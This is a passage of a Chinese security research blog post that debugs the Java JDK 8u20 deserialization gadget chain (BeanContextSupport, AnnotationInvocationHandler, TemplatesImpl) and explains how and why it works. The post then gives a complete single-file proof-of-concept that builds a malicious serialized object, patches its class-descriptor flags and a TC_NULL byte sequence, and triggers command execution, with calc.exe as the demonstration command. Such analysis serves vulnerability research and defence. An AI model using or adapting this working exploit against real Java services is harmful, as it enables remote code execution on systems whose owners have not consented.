</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">test2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">set</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReadWrite</span><span class="p">.</span><span class="na">writeFile</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="s">&#34;serobj.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">ser</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Test2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.ReadWrite</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test2</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReadWrite</span><span class="p">.</span><span class="na">readFile</span><span class="p">(</span><span class="s">&#34;ser+.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>然后你会发现并没有报错，而且<code>defaultDataEnd = true</code>也赋值了的。先看看<code>序列化数据</code>吧，用<code>zkar</code>看的</p>
<p>我先解释下这段数据位于啥地方，最外层是<code>java.util.LinkedHashSet</code>的<code>[]ClassData</code>，就是记录LinkedHashSet中<code>每个属性对应的值</code>，然后为啥单独拿这个地方来说呢，看3那个位置，这个对我们来说很重要，因为这里是报错产生的位置。</p>
<p>然后没有看过<code>序列化数据</code>的师傅建议跟着这个<a href="https://github.com/1nhann/java_ser_format">思维导图</a>看，还是挺建议看的，把每个值的注释含义以及完整看一个序列化数据基本上就都能看懂了。</p>
<p><img loading="lazy" src="images/image-20250510160223996.png" alt="image-20250510160223996"  />
</p>
<p>然后简单提一点吧<code>@ObjectAnnotation</code>在数据里面当时没看懂的，后面看到下图这个才理解，可以理解为序列化数据吧（刚开始看的时候困惑了下，这里也是简单提一下</p>
<p><img loading="lazy" src="images/image-20250510161134923.png" alt="image-20250510161134923"  />
</p>
<p>然后你会看序列化数据后，你肯定还关心一个点<code>@ClassDescFlags</code>，可以看到Test2是没有<code>SC_WRITE_METHOD</code>这个值，那他为什么<code>没有报错捏</code>？</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@ClassName</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nd">@Length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">5</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">0x00</span><span class="w"> </span><span class="n">05</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nd">@Value</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Test2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">0x54</span><span class="w"> </span><span class="n">65</span><span class="w"> </span><span class="n">73</span><span class="w"> </span><span class="n">74</span><span class="w"> </span><span class="n">32</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@SerialVersionUID</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">6232696428067116234</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">0x56</span><span class="w"> </span><span class="n">7e</span><span class="w"> </span><span class="n">fc</span><span class="w"> </span><span class="n">61</span><span class="w"> </span><span class="n">0b</span><span class="w"> </span><span class="n">c9</span><span class="w"> </span><span class="n">54</span><span class="w"> </span><span class="n">ca</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Handler</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">8257558</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@ClassDescFlags</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">SC_SERIALIZABLE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">0x02</span><span class="w">
</span></span></span></code></pre></div><h4 id="回到正题">回到正题<a hidden class="anchor" aria-hidden="true" href="#回到正题">#</a></h4>
<p>我们在<code>赋值true</code>后往后跟踪，</p>
<p><img loading="lazy" src="images/image-20250510161804489.png" alt="image-20250510161804489"  />
</p>
<p>发现Test2反序列化完成后，会把<code>defaultDataEnd = false</code>重新覆盖掉的。（所以没有<code>writeObject()</code>不是罪魁祸首）</p>
<blockquote>
<p>然后再<strong>反序列化<code>null</code>，再到反序列化<code>count = ois.readInt();</code></strong>（在结合上面序列化数据分析的）过程是这样。readInt()结束后，也就意味着<code>BeanContextSupport</code>反序列化<code>结束了</code>，然后到下一个对象了String test2的反序列化了（这里为什么说这个，对后面理解是有用的</p>
</blockquote>
<p><img loading="lazy" src="images/image-20250510161925536.png" alt="image-20250510161925536"  />
</p>
<p>debug表达式</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&#34;0x%02X&#34;</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">bin</span><span class="p">.</span><span class="na">in</span><span class="p">.</span><span class="na">in</span><span class="p">.</span><span class="na">buf</span><span class="o">[</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">bin</span><span class="p">.</span><span class="na">in</span><span class="p">.</span><span class="na">in</span><span class="p">.</span><span class="na">pos</span><span class="o">-</span><span class="n">1</span><span class="o">]</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><h4 id="annotationinvocationhandler-throw原因">AnnotationInvocationHandler throw原因<a hidden class="anchor" aria-hidden="true" href="#annotationinvocationhandler-throw原因">#</a></h4>
<p>那<code>AnnotationInvocationHandler</code>是什么原因呢自然是跟他readObject报错是有关系的。</p>
<p>报错最后throw的是<code>IOException的报错</code>，然后下图2是捕获<code>ClassNotFoundException</code>报错的，所以这里不会进入catch，而是**<code>走完finally（没能执行defaultDataEnd = false）继续跳转到上层throw</code>**（这个步骤重复了几次），最后才被<code>BeanContextSupport的catch</code>捕获<code>IOException</code></p>
<p><img loading="lazy" src="images/image-20250510165542595.png" alt="image-20250510165542595"  />
</p>
<p><img loading="lazy" src="images/image-20250510165615223.png" alt="image-20250510165615223"  />
</p>
<p><img loading="lazy" src="images/image-20250510165647804.png" alt="image-20250510165647804"  />
</p>
<p>于是这里又多了一层理解，及<code>BeanContextSupport</code>catch能捕获的error要<code>包含</code>AnnotationInvocationHandler的<code>throw</code>才行而不只是满足双层try/catch结构</p>
<p><img loading="lazy" src="images/image-20250510170419598.png" alt="image-20250510170419598"  />
</p>
<h4 id="原因小结">原因小结<a hidden class="anchor" aria-hidden="true" href="#原因小结">#</a></h4>
<p>所以就是<code>readObject报错</code>导致退出了，从而没能让<code>defaultDataEnd = false</code>重新覆盖掉。导致readInt()报错。而<strong>添加</strong><code>SC_WRITE_METHOD</code>只是我们利用的手段，不是原因</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">flagsReplace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="n">0x02</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x02</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">getSubarrayIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">flagsReplace</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">deleteAt</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">addAtIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">0x03</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>所以这里我们把flags 0x02改成<code>0x03</code>（<code>SC_WRITE_METHOD</code>值是<code>0x01</code>所以这里+1），这里zkar看序列化数据报错了，可以用另一个工具替代下SerializationDumper</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">TOOLS</span><span class="err">\</span><span class="n">Java</span><span class="err">\</span><span class="n">jdk</span><span class="o">-</span><span class="n">17</span><span class="err">\</span><span class="n">bin</span><span class="err">\</span><span class="n">java</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">SerializationDumper</span><span class="o">-</span><span class="n">v1</span><span class="p">.</span><span class="na">14</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">26618</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">Ljava</span><span class="err">\</span><span class="n">jdk7u21</span><span class="o">-</span><span class="n">8u20</span><span class="err">\</span><span class="n">ser</span><span class="o">+</span><span class="p">.</span><span class="na">txt</span><span class="w">
</span></span></span></code></pre></div><h4 id="再次调试">再次调试<a hidden class="anchor" aria-hidden="true" href="#再次调试">#</a></h4>
<p>从<code>defaultDataEnd = true</code>最后那个<code>}</code>那里开始吧，然后发现会一路throw到<code>BeanContextSupport</code>catch <code>continue;</code>，直接退出了<code>BeanContextSupport包裹类</code>的反序列化，直接来到<code>deserialize</code>的<code>ois.readInt();</code></p>
<p><img loading="lazy" src="images/image-20250510174520949.png" alt="image-20250510174520949"  />
</p>
<p><img loading="lazy" src="images/image-20250510174904454.png" alt="image-20250510174904454"  />
</p>
<h4 id="导致的问题">导致的问题<a hidden class="anchor" aria-hidden="true" href="#导致的问题">#</a></h4>
<p>导致了个什么问题呢？</p>
<blockquote>
<p>map的key是<code>AnnotationInvocationHandler</code>，而我们设置的map的value是<code>null</code>，这里AnnotationInvocationHandler反序列化完就<code>中断了map的反序列化</code>导致**<code>null没有反序列化</code>**，而程序直接来到了<code>ois.readInt();</code>，序列化数据in.in.pos却还在<code>null值</code>的位置，然后导致throw</p>
<p>然而这个null并不影响我们利用，所以直接把这个值删掉就好</p>
</blockquote>
<p><img loading="lazy" src="images/image-20250510173704432.png" alt="image-20250510173704432"  />
</p>
<p><img loading="lazy" src="images/image-20250510175358299.png" alt="image-20250510175358299"  />
</p>
<blockquote>
<p>这里再提一嘴null<code>为什么删掉没事</code>。以及为什么要删除</p>
</blockquote>
<p>还记得上面那个序列化数据图的分析么，下图这里是同一个位置含义差不多，这里调试对应的地方是<code>TC_NULL</code>,而int对应的是<code>TC_BLOCKDATA</code>，所以我们要让<code>TC_BLOCKDATA</code>提前，而为什么没影响呢，<code>readInt()</code>后其实就标志着<code>BeanContextSupport</code>反序列化的结束，然后<code>紧接着要反序列化</code>add的第二个对象了（下图是指向<code>TemplatesImpl</code>的Handler），所以这里不能添加值，只能删除值，因为添加值会对后面的反序列化照成影响，而删除<code>TC_NULL</code>能在前面完成闭环。</p>
<p><img loading="lazy" src="images/image-20250510191146304.png" alt="image-20250510191146304"  />
</p>
<h4 id="最简洁poc">最简洁poc<a hidden class="anchor" aria-hidden="true" href="#最简洁poc">#</a></h4>
<p>大功告成，我们没有直接给<code>AnnotationInvocationHandler</code>改写一个writeObject，所以可以直接一个文件就可以执行了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtMethod</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.ByteUtil</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Gadgets</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.ReadWrite</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Reflections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.beancontext.BeanContextSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.LinkedHashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jdk8u20_poc</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">TemplatesImpl</span><span class="p">)</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createTemplatesImpl</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">ih</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">Reflections</span><span class="p">.</span><span class="na">getFirstCtor</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="s">&#34;type&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Templates</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createProxy</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanContextSupport</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanContextSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;serializable&#34;</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">tmpMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tmpMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;children&#34;</span><span class="p">,</span><span class="n">tmpMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashSet</span><span class="p">();</span><span class="c1">//这样可以确保先反序列化 templates 再反序列化 proxy</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">proxy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hm</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;f5a5a608&#34;</span><span class="p">,</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="s">&#34;memberValues&#34;</span><span class="p">,</span><span class="n">hm</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">set</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">nullReplace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="n">0x70</span><span class="p">,</span><span class="n">0x77</span><span class="p">,</span><span class="n">0x04</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x78</span><span class="p">,</span><span class="n">0x71</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">flagsReplace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="n">0x02</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x02</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">getSubarrayIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">flagsReplace</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">deleteAt</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">addAtIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">0x03</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">getSubarrayIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">nullReplace</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">deleteAt</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">j</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReadWrite</span><span class="p">.</span><span class="na">writeFile</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="s">&#34;ser+.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReadWrite</span><span class="p">.</span><span class="na">readFile</span><span class="p">(</span><span class="s">&#34;ser+.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250510182306287.png" alt="image-20250510182306287"  />
</p>
<h3 id="8u20修复">8u20修复<a hidden class="anchor" aria-hidden="true" href="#8u20修复">#</a></h3>
<p>最后反射调用的方法只能是下面3个，导致不能调用sink点了</p>
<p><img loading="lazy" src="images/image-20250510193349124.png" alt="image-20250510193349124"  />
</p>
<blockquote>
